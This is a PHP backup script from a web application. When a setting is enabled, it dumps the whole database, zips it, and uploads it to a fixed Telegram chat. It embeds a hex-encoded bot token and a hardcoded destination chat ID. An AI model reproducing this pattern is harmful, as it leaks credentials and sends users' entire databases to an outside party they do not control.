<?php
header('Content-type: application-json');

use core\classes\dbWrapper\db;
use Core\Classes\Utils\Utils;
use Core\Classes\System\dump;
use Core\Classes\System\Updater;

$updaters = new Updater;

$dump = new dump;

$getCurrentVerison = $updaters::getCurrentVersion();

$backup_settings = db::select([
    'table_name' => 'function_settting',
    'col_list' => '*',
    'query' => [
        'base_query' => ' WHERE sett_name = :name ',
    ],
    'bindList' => [
        ':name' => 'telegram_backup'
    ]
])->first()->get();

$is_backup = $backup_settings['sett_on'];

if(!$is_backup) {
    return;
}

$dump::dumpDatabase();

Utils::createZip([
    'path_to_file' => $dump::$PATH_TO_BACKUP_DATABASE_DIR,
    'file_name' => $dump::$BACKUP_DATABASE_NAME.'.sql'
]);

$backup_file = $dump::$PATH_TO_BACKUP_DATABASE_DIR.$dump::$BACKUP_DATABASE_NAME.'.sql.zip';

$token = '323030333639363632373a414148557a67433454476b4b4b783267753076347159594f63785955467134525f534d';

$date = date("d.m.Y");

$arrayQuery = array(
    'chat_id' => -1001986338105,
    'caption' => $user->getCurrentUser('get_name') . "\n$date" . "\nVERSION: $getCurrentVerison",
    'document' => curl_file_create($backup_file, 'text/plain' , basename($backup_file))
);		

$ch = curl_init('https://api.telegram.org/bot'. hex2bin($token) .'/sendDocument');


curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $arrayQuery);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, false);
$res = curl_exec($ch);
curl_close($ch);
